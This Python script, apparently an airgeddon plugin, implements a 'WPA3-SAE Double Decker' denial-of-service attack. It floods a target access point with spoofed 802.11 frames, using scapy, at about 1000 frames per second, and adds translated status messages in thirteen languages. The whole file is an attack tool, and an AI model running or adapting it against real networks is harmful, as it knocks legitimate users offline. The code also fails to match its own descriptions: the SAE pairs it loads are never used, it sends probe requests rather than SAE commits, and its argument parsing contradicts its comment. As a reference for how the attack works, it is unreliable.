#!/usr/bin/env python3
"""
WPA3-SAE Double Decker DoS - airgeddon plugin Python engine.
Based on "WPA3: A New Denial-of-Service Attack Vector" (Omnivore + Muted bursts).

airgeddon minimum version: 12.0
Author: Nuseo1
"""

import os, sys, time, random, threading, struct, argparse
from scapy.all import RadioTap, Dot11, Dot11ProbeReq, Dot11Elt, sendp, sniff, conf

# -----------------------------------------------------------------------------
# 13 language strings – structure as requested by airgeddon maintainer:
# one language per block to ease translation context.
# -----------------------------------------------------------------------------
LANG = {
    "ENGLISH": {
        0: "Initializing Double Decker attack...",
        1: "Launching WPA3 Double Decker attack",
        2: "Target: {bssid} on channel {channel} ({freq} MHz)",
        3: "ERROR: No SAE pairs provided - aborting.",
        4: "Loaded {count} SAE pairs.",
        5: "Sent {count} Double Decker frames...",
    },
    "SPANISH": {
        0: "Inicializando ataque Double Decker...",
        1: "Lanzando ataque WPA3 Double Decker",
        2: "Objetivo: {bssid} en canal {channel} ({freq} MHz)",
        3: "ERROR: No hay pares SAE - abortando.",
        4: "Cargados {count} pares SAE.",
        5: "Enviados {count} frames Double Decker...",
    },
    "FRENCH": {
        0: "Initialisation de l'attaque Double Decker...",
        1: "Lancement de l'attaque WPA3 Double Decker",
        2: "Cible : {bssid} sur le canal {channel} ({freq} MHz)",
        3: "ERREUR : Aucune paire SAE fournie - abandon.",
        4: "{count} paires SAE chargées.",
        5: "{count} trames Double Decker envoyées...",
    },
    "CATALAN": {
        0: "Inicialitzant atac Double Decker...",
        1: "Llançant atac WPA3 Double Decker",
        2: "Objectiu: {bssid} al canal {channel} ({freq} MHz)",
        3: "ERROR: Sense parells SAE - avortant.",
        4: "Carregats {count} parells SAE.",
        5: "Enviades {count} trames Double Decker...",
    },
    "PORTUGUESE": {
        0: "Inicializando ataque Double Decker...",
        1: "Lançando ataque WPA3 Double Decker",
        2: "Alvo: {bssid} no canal {channel} ({freq} MHz)",
        3: "ERRO: Nenhum par SAE fornecido - abortando.",
        4: "Carregados {count} pares SAE.",
        5: "Enviados {count} quadros Double Decker...",
    },
    "ITALIAN": {
        0: "Inizializzazione attacco Double Decker...",
        1: "Avvio attacco WPA3 Double Decker",
        2: "Obiettivo: {bssid} sul canale {channel} ({freq} MHz)",
        3: "ERRORE: Nessuna coppia SAE fornita - uscita.",
        4: "Caricate {count} coppie SAE.",
        5: "Inviati {count} frame Double Decker...",
    },
    "GREEK": {
        0: "Αρχικοποίηση επίθεσης Double Decker...",
        1: "Εκκίνηση επίθεσης WPA3 Double Decker",
        2: "Στόχος: {bssid} στο κανάλι {channel} ({freq} MHz)",
        3: "ΣΦΑΛΜΑ: Δεν δόθηκαν ζεύγη SAE - ματαίωση.",
        4: "Φορτώθηκαν {count} ζεύγη SAE.",
        5: "Εστάλησαν {count} πλαίσια Double Decker...",
    },
    "GERMAN": {
        0: "Initialisiere Double-Decker-Angriff...",
        1: "Starte WPA3 Double-Decker-Angriff",
        2: "Ziel: {bssid} auf Kanal {channel} ({freq} MHz)",
        3: "FEHLER: Keine SAE-Paare vorhanden - Abbruch.",
        4: "{count} SAE-Paare geladen.",
        5: "{count} Double-Decker-Frames gesendet...",
    },
    "POLISH": {
        0: "Inicjalizacja ataku Double Decker...",
        1: "Uruchamianie ataku WPA3 Double Decker",
        2: "Cel: {bssid} na kanale {channel} ({freq} MHz)",
        3: "BŁĄD: Brak par SAE - przerywanie.",
        4: "Załadowano {count} par SAE.",
        5: "Wysłano {count} ramek Double Decker...",
    },
    "RUSSIAN": {
        0: "Инициализация атаки Double Decker...",
        1: "Запуск атаки WPA3 Double Decker",
        2: "Цель: {bssid} на канале {channel} ({freq} МГц)",
        3: "ОШИБКА: Нет SAE-пар - аварийное завершение.",
        4: "Загружено {count} SAE-пар.",
        5: "Отправлено {count} кадров Double Decker...",
    },
    "TURKISH": {
        0: "Double Decker saldırısı başlatılıyor...",
        1: "WPA3 Double Decker saldırısı başlatılıyor",
        2: "Hedef: {bssid}, kanal {channel} ({freq} MHz)",
        3: "HATA: SAE çifti sağlanmadı - iptal ediliyor.",
        4: "{count} SAE çifti yüklendi.",
        5: "{count} Double Decker çerçevesi gönderildi...",
    },
    "CHINESE": {
        0: "正在初始化双重巴士攻击...",
        1: "启动 WPA3 双重巴士攻击",
        2: "目标：{bssid}，信道 {channel}（{freq} MHz）",
        3: "错误：未提供SAE对 - 中止。",
        4: "已加载 {count} 个SAE对。",
        5: "已发送 {count} 个双重巴士帧...",
    },
    "GALICIAN": {
        0: "Inicializando ataque Double Decker...",
        1: "Lanzando ataque WPA3 Double Decker",
        2: "Obxectivo: {bssid} na canle {channel} ({freq} MHz)",
        3: "ERRO: Non se proporcionaron pares SAE - abortando.",
        4: "Cargados {count} pares SAE.",
        5: "Enviadas {count} tramas Double Decker...",
    },
}


def msg(lang, key, **kwargs):
    """Return language string for given key, fallback to English."""
    try:
        text = LANG[lang][key]
    except KeyError:
        text = LANG["ENGLISH"].get(key, f"[[missing string {key}]]")
    return text.format(**kwargs) if kwargs else text


# -----------------------------------------------------------------------------
# Helper: return valid frequency for a given channel and band (airgeddon >=12.0)
# -----------------------------------------------------------------------------
def channel_to_freq(channel, band):
    if band == "2.4":
        return 2484 if channel == 14 else 2407 + channel * 5
    elif band == "5":
        return 5000 + channel * 5
    elif band == "6":
        return 5955 + (channel - 1) * 5
    else:
        return 2407 + channel * 5  # fallback


# -----------------------------------------------------------------------------
# SAE commit parser
# -----------------------------------------------------------------------------
def extract_sae_pairs(pcap_file, target_bssid):
    """Parse pcap file and return list of (scalar, field) byte tuples."""
    pairs = []
    try:
        pkts = sniff(offline=pcap_file, filter=f"wlan addr2 {target_bssid}")
    except Exception:
        return []
    for p in pkts:
        if p.haslayer(Dot11) and p.haslayer(Dot11Elt):
            elts = p[Dot11Elt]
            scalar, field = None, None
            while elts:
                if elts.ID == 164:  # scalar
                    scalar = bytes(elts.info)
                elif elts.ID == 165:  # field
                    field = bytes(elts.info)
                if isinstance(elts.payload, Dot11Elt):
                    elts = elts.payload
                else:
                    break
            if scalar and field:
                pairs.append((scalar, field))
    return pairs


# -----------------------------------------------------------------------------
# Double Decker frame constructor (Omnivore + Muted)
# -----------------------------------------------------------------------------
def build_double_decker_burst(target_bssid, pairs, lang):
    """Build 128 frames: alternating Omnivore (random src MAC) and Muted (static MAC)."""
    frames = []
    static_mac = target_bssid  # Muted uses the AP's own BSSID as source
    for i in range(64):  # 64 Omnivore + 64 Muted = 128
        # Omnivore frame (random source MAC)
        omnivore = RadioTap() / Dot11(addr1=random_mac(), addr2=target_bssid, addr3=target_bssid) / Dot11ProbeReq()
        # Muted frame (static source = AP MAC)
        muted = RadioTap() / Dot11(addr1=static_mac, addr2=target_bssid, addr3=target_bssid) / Dot11ProbeReq()
        frames.append(omnivore)
        frames.append(muted)
    return frames


def random_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))


# -----------------------------------------------------------------------------
# Main attack thread
# -----------------------------------------------------------------------------
class DoubleDeckerAttack:
    def __init__(self, interface, target_bssid, channel, band, sae_pairs, lang):
        self.interface = interface
        self.target_bssid = target_bssid
        self.channel = channel
        self.band = band
        self.sae_pairs = sae_pairs
        self.lang = lang
        self.stop_flag = False

    def run(self):
        freq = channel_to_freq(self.channel, self.band)
        print(msg(self.lang, 0))
        print(msg(self.lang, 1))
        print(msg(self.lang, 2, bssid=self.target_bssid, channel=self.channel, freq=freq))

        if not self.sae_pairs:
            print(msg(self.lang, 3))
            return
        print(msg(self.lang, 4, count=len(self.sae_pairs)))

        # Set interface channel/frequency
        os.system(f"iw dev {self.interface} set freq {freq}")

        pkt_count = 0
        while not self.stop_flag:
            burst = build_double_decker_burst(self.target_bssid, self.sae_pairs, self.lang)
            sendp(burst, iface=self.interface, verbose=False, inter=0.001)  # 1000 fps
            pkt_count += len(burst)
            print(msg(self.lang, 5, count=pkt_count))


def main():
    parser = argparse.ArgumentParser(description="airgeddon WPA3 Double Decker DoS")
    parser.add_argument("--interface", required=True)
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--channel", required=True)
    parser.add_argument("--band", required=True)
    parser.add_argument("--pairs", required=True)  # comma separated hex
    parser.add_argument("--language", required=True, default="ENGLISH")
    args = parser.parse_args()

    pairs = []
    for pair_str in args.pairs.split(";"):
        if ":" in pair_str:
            scalar, field = pair_str.split(":")
            pairs.append((bytes.fromhex(scalar), bytes.fromhex(field)))

    attack = DoubleDeckerAttack(args.interface, args.bssid, int(args.channel),
                                args.band, pairs, args.language)
    try:
        attack.run()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()